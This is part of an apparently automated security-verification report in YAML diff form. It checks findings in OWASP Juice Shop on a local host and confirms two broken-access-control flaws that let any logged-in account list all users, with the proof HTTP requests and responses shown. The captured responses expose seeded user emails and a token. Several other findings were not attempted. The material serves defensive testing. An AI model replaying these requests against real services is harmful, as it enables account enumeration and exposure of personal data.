+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: confirmed
+  confidence: medium
+  rationale: GET /api/Users returned 200 with the full account list (ids, emails,
+    roles) for admin-1 (step 7). The normal account account-1 got the identical body,
+    with the same SHA-256 and length 6911 (step 8). The request with no credentials
+    got 401 (step 9). So any authenticated user can list all accounts.
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 7
+    - 8
+    - 9
+    kind: access-control
+    form: privileged-comparison
+    tested_path: /api/Users
+    variant: null
+    hypothesis: Listing all user accounts is an admin-level function; admin gets 200,
+      no credentials get 401, and a normal account gets the same full list.
+    observation_pointer: null
+    scope: cited requests only; the same answer as for admin-1 does not show that
+      the function is meant for privileged accounts only; that restriction is taken
+      from the finding
+  identities_used:
+  - account-1
+  - admin-1
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - 'Application screenshot unavailable: no application page showing the confirmed
+    effect was captured; for API-only findings the recorded HTTP exchanges are the
+    primary evidence.'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-060-exchanges.json
+    redacted: true
+    sha256: e44a755c9df45418457af9f4d466bb4e5aa7ff83a70c64739f63af2b45ca7a69
+  - kind: har
+    path: evidence/T-060-poc.har
+    redacted: true
+    sha256: b2c018f087649a9db7c5b2cb66d9889eb44f668e62c2481fb84b25cbaa8adf05
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-060-any-authenticated-user-can-list-all-user-accounts-http-1.png
+    sha256: 46300cbac7bbaa92cf67ec34d0933d513b290b1412378cd90e366e54c1da803c
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 2
+  - kind: screenshot
+    path: evidence/T-060-any-authenticated-user-can-list-all-user-accounts-http-2.png
+    sha256: 22e6ee9838e03074a2a02dc3b7b09c14d025a6f5e6b5a79ed901fa76690d1fb6
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  - kind: screenshot
+    path: evidence/T-060-any-authenticated-user-can-list-all-user-accounts-explanation-1.png
+    sha256: be367c30e2e1891cc0ea23e514c6cf95a9282d74b1b47070a279400b437da486
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+    presentation_review: true
+  poc:
+    file: evidence/T-060-poc.har
+    steps:
+    - step: 2
+      line: http_request GET http://127.0.0.1:3000/api/Users as account-1 → 200, 6911
+        bytes
+      decisive: false
+    - step: 3
+      line: http_request GET http://127.0.0.1:3000/api/Users as anonymous → 401, 972
+        bytes
+      decisive: false
+    - step: 4
+      line: http_request GET http://127.0.0.1:3000/api/vrff5aa4e6c7a151b9e as anonymous
+        → 500, 2448 bytes
+      decisive: false
+    - step: 7
+      line: http_request GET http://127.0.0.1:3000/api/Users as admin-1 → 200, 6911
+        bytes
+      decisive: true
+    - step: 8
+      line: http_request GET http://127.0.0.1:3000/api/Users as account-1 → 200, 6911
+        bytes
+      decisive: true
+    - step: 9
+      line: http_request GET http://127.0.0.1:3000/api/Users as anonymous → 401, 972
+        bytes
+      decisive: true
+    shown:
+    - step: 7
+      request: 'GET /api/Users HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+        authorization: [identity admin-1]
+
+
+        '
+      elapsed_ms: 43
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        etag: W/"1aff-40TR/Y6tV6wgqf2gJMyZDeCv3OM"
+
+        vary: Accept-Encoding
+
+        content-encoding: br
+
+        date: Thu, 12 Nov 2026 12:50:36 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+        transfer-encoding: chunked
+
+
+        {"status":"success","data":[{"id":1,"username":"","email":"[redacted]","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":2,"username":"","email":"[redacted]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":3,"username":"","email":"[redacted]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null},{"id":5,"username":"","email":"ciso@juice-sh.op","role":"deluxe","deluxeToken":"d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null},{"id":6,"username":"","email":"support@juice-sh.o
+
+        [… characters 1 to 1500 shown of a 6911-byte answer; full response in evidence/T-060-poc.har]'
+      role: normal
+      role_label: privileged account
+      request_excerpt: 'GET /api/Users HTTP/1.1
+
+        authorization: ⟦[identity admin-1]⟧
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        Selected JSON fields (other content in HAR):
+
+        /data/0/id: 1
+
+        /data/0/role: "admin"
+
+        /data/1/id: 2
+
+        /data/1/role: "customer"
+
+        /data/2/id: 3
+
+        /data/2/role: "customer"
+
+        /data/3/id: 4'
+      facts: []
+    - step: 9
+      request: 'GET /api/Users HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 4
+      response: "HTTP/1.1 401 Unauthorized\naccess-control-allow-origin: *\nx-content-type-options:\
+        \ nosniff\nx-frame-options: SAMEORIGIN\nfeature-policy: payment 'self'\nx-recruiting:\
+        \ /#/jobs\ncontent-type: text/html; charset=utf-8\nvary: Accept-Encoding\n\
+        date: Thu, 12 Nov 2026 12:50:48 GMT\nconnection: keep-alive\nkeep-alive: timeout=5\n\
+        transfer-encoding: chunked\n\n<html>\n  <head>\n    <meta charset='utf-8'>\
+        \ \n    <title>UnauthorizedError: No Authorization header was found</title>\n\
+        \    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n\
+        \  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\"\
+        , \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%,\
+        \ from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top,\
+        \ #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing:\
+        \ antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1\
+        \ em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size:\
+        \ 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n\
+        #stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n  \
+        \  <div id=\"wrapper\">\n      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>\n\
+        \      <h2><em>401</em> UnauthorizedError: No Authorization header was found</h2>\n\
+        \      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+      role: control
+      role_label: without login
+      request_excerpt: 'GET /api/Users HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 401 Unauthorized
+
+        content-type: text/html; charset=utf-8
+
+
+        Visible text: UnauthorizedError: No Authorization header was found OWASP Juice
+        Shop (Express ^4.22.1) 401 UnauthorizedError: No Authorization header was
+        found'
+      facts: []
+    - step: 8
+      request: 'GET /api/Users HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+        authorization: [identity account-1]
+
+
+        '
+      elapsed_ms: 39
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        etag: W/"1aff-40TR/Y6tV6wgqf2gJMyZDeCv3OM"
+
+        vary: Accept-Encoding
+
+        content-encoding: br
+
+        date: Thu, 12 Nov 2026 12:50:41 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+        transfer-encoding: chunked
+
+
+        {"status":"success","data":[{"id":1,"username":"","email":"[redacted]","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":2,"username":"","email":"[redacted]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":3,"username":"","email":"[redacted]","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null},{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null},{"id":5,"username":"","email":"ciso@juice-sh.op","role":"deluxe","deluxeToken":"d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null},{"id":6,"username":"","email":"support@juice-sh.o
+
+        [… characters 1 to 1500 shown of a 6911-byte answer; full response in evidence/T-060-poc.har]'
+      role: attack
+      role_label: normal account calls the privileged function
+      request_excerpt: 'GET /api/Users HTTP/1.1
+
+        authorization: ⟦[identity account-1]⟧
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        Selected JSON fields (other content in HAR):
+
+        /data/0/id: 1
+
+        /data/0/role: "admin"
+
+        /data/1/id: 2
+
+        /data/1/role: "customer"
+
+        /data/2/id: 3
+
+        /data/2/role: "customer"
+
+        /data/3/id: 4'
+      facts:
+      - 'Compared with the normal request in step 7: same status 200, the identical
+        answer, compared in code over the whole body.'
+  planning:
+  - step: 1
+    path: /api/Users
+    hypothesis: Any authenticated normal account can GET /api/Users and receive all
+      accounts; the same content without credentials is refused.
+  - step: 6
+    path: /api/Users
+    hypothesis: Listing all user accounts is an admin-level function; admin gets 200,
+      no credentials get 401, and a normal account gets the same full list.
+  evidence_review:
+    status: clear
+    rounds: 1
+    reviews: 2
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations:
+    - variant: T-060
+      explanation: 'GET /api/Users returned 200 with the account list for admin-1
+        (step 7) and for normal account account-1 (step 8), with the same ETag; the
+        checker found the full bodies identical (6911 bytes). With no Authorization
+        header it returned 401 (step 9). Limitations: the premise that the listing
+        should be admin-only comes from the finding, not the evidence. Excerpts stop
+        at 1500 of 6911 bytes, so full equality rests on the code-side comparison
+        and the ETag. Some emails show ''[redacted]'' from the recording; its rule
+        isn''t explained. No application screenshot was captured.'
+      quotes:
+      - step: 8
+        part: response
+        text: HTTP/1.1 200 OK
+      - step: 8
+        part: response
+        text: 'etag: W/"1aff-40TR/Y6tV6wgqf2gJMyZDeCv3OM"'
+      - step: 9
+        part: response
+        text: HTTP/1.1 401 Unauthorized
+    variants:
+    - T-060
+  technical_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    inspected_steps: []
+    reason: No unresolved technical objections in the reviewed attempts.
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:50:21.633288Z'
+    finished: '2026-11-12T12:51:05.831718Z'
+- result_id: VF-031
+  finding_ref:
+    id: T-069
+    match_key: routes/authenticatedusers.ts|CWE-862
+    instance: routes/authenticatedUsers.ts:12
+    title: User list readable by any authenticated user — routes/authenticatedUsers.ts:12
+    cwe: CWE-862
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: confirmed
+  confidence: medium
+  rationale: GET /rest/user/authentication-details returned 200 with the full user
+    list (admin and customer records, role, lastLoginIp, lastLoginTime) to normal
+    account-1. The body is byte-identical (same sha256, 8953 bytes) to the admin-1
+    reference response. The unauthenticated request got 401. So only token validity
+    gates the endpoint, and any customer can enumerate all accounts.
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 3
+    - 4
+    - 5
+    kind: access-control
+    form: privileged-comparison
+    tested_path: /rest/user/authentication-details
+    variant: null
+    hypothesis: Any authenticated normal account can read the full user list at /rest/user/authentication-details,
+      which should be admin-only.
+    observation_pointer: null
+    scope: cited requests only; the same answer as for admin-1 does not show that
+      the function is meant for privileged accounts only; that restriction is taken
+      from the finding
+  identities_used:
+  - account-1
+  - admin-1
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - Password fields are masked in the response, but emails, roles and login metadata
+    are exposed.
+  - account-2 and a malformed token were not tested.
+  - 'Application screenshot unavailable: no application page showing the confirmed
+    effect was captured; for API-only findings the recorded HTTP exchanges are the
+    primary evidence.'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-069-exchanges.json
+    redacted: true
+    sha256: 94f09a6168ccad93befc277cbcd77c82d5fe8ea08ca58acdc8ed0069aa544a0b
+  - kind: har
+    path: evidence/T-069-poc.har
+    redacted: true
+    sha256: 843aae83dd3838e50860c08eb2daa518614dde016b6aacbabf1753e6b33f7ff0
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-069-user-list-readable-by-any-authenticated-user-http-1.png
+    sha256: 675c696513768fd1bd868efae5c0d4ce0c750ade9249d8cd08cf40bd3b5cf9f1
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 2
+  - kind: screenshot
+    path: evidence/T-069-user-list-readable-by-any-authenticated-user-http-2.png
+    sha256: 89d980b162b4ec93e581b6cc2e174f227125b0063577eecfe1738e2c6812675b
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  poc:
+    file: evidence/T-069-poc.har
+    steps:
+    - step: 3
+      line: http_request GET http://127.0.0.1:3000/rest/user/authentication-details
+        as account-1 → 200, 8953 bytes
+      decisive: true
+    - step: 4
+      line: http_request GET http://127.0.0.1:3000/rest/user/authentication-details
+        as anonymous → 401, 972 bytes
+      decisive: true
+    - step: 5
+      line: http_request GET http://127.0.0.1:3000/rest/user/authentication-details
+        as admin-1 → 200, 8953 bytes
+      decisive: true
+    shown:
+    - step: 5
+      request: 'GET /rest/user/authentication-details HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+        authorization: [identity admin-1]
+
+
+        '
+      elapsed_ms: 41
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        etag: W/"22f9-tlgQWLops6L1Q1FiV34aHP2gJdc"
+
+        vary: Accept-Encoding
+
+        content-encoding: br
+
+        date: Thu, 12 Nov 2026 12:52:08 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+        transfer-encoding: chunked
+
+
+        {"status":"success","data":[{"id":1,"username":"","email":"[redacted]","password":"********************************","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487306},{"id":2,"username":"","email":"[redacted]","password":"********************************","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487305},{"id":3,"username":"","email":"[redacted]","password":"********************************","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487306},{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"********************************","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null,"lastLoginTime":null},{"id":5,"username":"","email":"c
+
+        [… characters 1 to 1500 shown of a 8953-byte answer; full response in evidence/T-069-poc.har]'
+      role: normal
+      role_label: privileged account
+      request_excerpt: 'GET /rest/user/authentication-details HTTP/1.1
+
+        authorization: ⟦[identity admin-1]⟧
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        Selected JSON fields (other content in HAR):
+
+        /data/0/id: 1
+
+        /data/0/role: "admin"
+
+        /data/1/id: 2
+
+        /data/1/role: "customer"
+
+        /data/2/id: 3
+
+        /data/2/role: "customer"
+
+        /data/3/id: 4'
+      facts: []
+    - step: 4
+      request: 'GET /rest/user/authentication-details HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 4
+      response: "HTTP/1.1 401 Unauthorized\naccess-control-allow-origin: *\nx-content-type-options:\
+        \ nosniff\nx-frame-options: SAMEORIGIN\nfeature-policy: payment 'self'\nx-recruiting:\
+        \ /#/jobs\ncontent-type: text/html; charset=utf-8\nvary: Accept-Encoding\n\
+        date: Thu, 12 Nov 2026 12:52:05 GMT\nconnection: keep-alive\nkeep-alive: timeout=5\n\
+        transfer-encoding: chunked\n\n<html>\n  <head>\n    <meta charset='utf-8'>\
+        \ \n    <title>UnauthorizedError: No Authorization header was found</title>\n\
+        \    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n\
+        \  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\"\
+        , \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%,\
+        \ from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top,\
+        \ #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webkit-font-smoothing:\
+        \ antialiased;\n}\nh1, h2 {\n  font-size: 22px;\n  color: #343434;\n}\nh1\
+        \ em, h2 em {\n  padding: 0 5px;\n  font-weight: normal;\n}\nh1 {\n  font-size:\
+        \ 60px;\n}\nh2 {\n  margin-top: 10px;\n}\nul li {\n  list-style: none;\n}\n\
+        #stacktrace {\n  margin-left: 60px;\n}\n</style>\n  </head>\n  <body>\n  \
+        \  <div id=\"wrapper\">\n      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>\n\
+        \      <h2><em>401</em> UnauthorizedError: No Authorization header was found</h2>\n\
+        \      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>\n"
+      role: control
+      role_label: without login
+      request_excerpt: 'GET /rest/user/authentication-details HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 401 Unauthorized
+
+        content-type: text/html; charset=utf-8
+
+
+        Visible text: UnauthorizedError: No Authorization header was found OWASP Juice
+        Shop (Express ^4.22.1) 401 UnauthorizedError: No Authorization header was
+        found'
+      facts: []
+    - step: 3
+      request: 'GET /rest/user/authentication-details HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+        authorization: [identity account-1]
+
+
+        '
+      elapsed_ms: 42
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        etag: W/"22f9-tlgQWLops6L1Q1FiV34aHP2gJdc"
+
+        vary: Accept-Encoding
+
+        content-encoding: br
+
+        date: Thu, 12 Nov 2026 12:51:56 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+        transfer-encoding: chunked
+
+
+        {"status":"success","data":[{"id":1,"username":"","email":"[redacted]","password":"********************************","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487306},{"id":2,"username":"","email":"[redacted]","password":"********************************","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487305},{"id":3,"username":"","email":"[redacted]","password":"********************************","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.921Z","updatedAt":"2026-11-12T09:56:27.921Z","deletedAt":null,"lastLoginTime":1794487306},{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","password":"********************************","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-11-12T09:56:27.922Z","updatedAt":"2026-11-12T09:56:27.922Z","deletedAt":null,"lastLoginTime":null},{"id":5,"username":"","email":"c
+
+        [… characters 1 to 1500 shown of a 8953-byte answer; full response in evidence/T-069-poc.har]'
+      role: attack
+      role_label: normal account calls the privileged function
+      request_excerpt: 'GET /rest/user/authentication-details HTTP/1.1
+
+        authorization: ⟦[identity account-1]⟧
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        Selected JSON fields (other content in HAR):
+
+        /data/0/id: 1
+
+        /data/0/role: "admin"
+
+        /data/1/id: 2
+
+        /data/1/role: "customer"
+
+        /data/2/id: 3
+
+        /data/2/role: "customer"
+
+        /data/3/id: 4'
+      facts:
+      - 'Compared with the normal request in step 5: same status 200, the identical
+        answer, compared in code over the whole body.'
+  planning:
+  - step: 2
+    path: /rest/user/authentication-details
+    hypothesis: Any authenticated normal account can read the full user list at /rest/user/authentication-details,
+      which should be admin-only.
+  evidence_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    visual_review: not-performed
+    images_reviewed: []
+    reason: Evidence text and layout checks passed; no screenshot shown to the model
+      (no application screenshot to show).
+    issues: []
+    presentations: []
+    variants:
+    - T-069
+  technical_review:
+    status: clear
+    rounds: 1
+    reviews: 2
+    inspected_steps: []
+    reason: No unresolved technical objections in the reviewed attempts.
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: routes/authenticatedUsers.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:51:29.646388Z'
+    finished: '2026-11-12T12:52:29.397214Z'
+- result_id: VF-032
+  finding_ref:
+    id: T-022
+    match_key: routes/resetpassword.ts|CWE-640
+    instance: routes/resetPassword.ts:41
+    title: Password reset relies on guessable security — routes/resetPassword.ts:41
+    cwe: CWE-640
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-640
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-640
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/resetPassword.ts
+    source_line: null
+- result_id: VF-033
+  finding_ref:
+    id: T-023
+    match_key: routes/dataerasure.ts|CWE-22
+    instance: routes/dataErasure.ts:104
+    title: Arbitrary server file read — routes/dataErasure.ts:104
+    cwe: CWE-22
+    variant: variant-001
+    variant_digest: e2032499d98e96ec50ed8896c6bd3beee16867ce509ab8cd12fbea76b016399d
+  class: path-traversal
+  eligibility:
+    status: dynamic
+    reason: 'proof: marker-file'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: no marker_file in the scope'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/dataErasure.ts
+    source_line: null
+- result_id: VF-034
+  finding_ref:
+    id: T-024
+    match_key: routes/fileupload.ts|CWE-22
+    instance: routes/fileUpload.ts:34
+    title: Zip entry path traversal on complaint upload — routes/fileUpload.ts:34
+    cwe: CWE-22
+    variant: variant-001
+    variant_digest: 6255274d60dd6a8a3201df97f7e68beb46595fda85ba6632c5362c93f4a244eb
+  class: path-traversal
+  eligibility:
+    status: dynamic
+    reason: 'proof: marker-file'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: no marker_file in the scope'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/fileUpload.ts
+    source_line: null
+- result_id: VF-035
+  finding_ref:
+    id: T-025
+    match_key: routes/b2border.ts|code-eval
+    instance: routes/b2bOrder.ts:23
+    title: Request body orderLinesData evaluated by notevil in vm — routes/b2bOrder.ts:23
+    cwe: CWE-95
+    variant: variant-001
+    variant_digest: 889c47d4fd965c0a1d984fba42a6360e70849a8f68e5194fa784203355362b49
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: mechanism-specific'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/b2bOrder.ts
+    source_line: null
+- result_id: VF-036
+  finding_ref:
+    id: T-026
+    match_key: server.ts|CWE-306
+    instance: server.ts:503
+    title: Unauthenticated modification of products — server.ts:503
+    cwe: CWE-306
+    variant: v1
+    variant_digest: b84d7a1d0a9c7e0c470f0d275681991f47d5316cf6533026e64e0f21f7ab3062
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every request the assessment names writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-037
+  finding_ref:
+    id: T-027
+    match_key: routes/wallet.ts|CWE-472
+    instance: routes/wallet.ts:27
+    title: Wallet credited with unverified body amount — routes/wallet.ts:27
+    cwe: CWE-472
+    variant: v1
+    variant_digest: fc35a07b8731441448a80bbfebc5ed9502d90da75fd368eae39a927b5a3d16c3
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-472
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-472
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/wallet.ts
+    source_line: null
+- result_id: VF-038
+  finding_ref:
+    id: T-030
+    match_key: routes/basketitems.ts|CWE-639
+    instance: routes/basketItems.ts:68
+    title: Basket item update lacks ownership check and field — routes/basketItems.ts:68
+    cwe: CWE-639
+    variant: variant-001
+    variant_digest: 34fd712f30dead13c6dfad3d4cf8f6d7b6cfc4b7b9e765d43de1736c04a7a61d
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
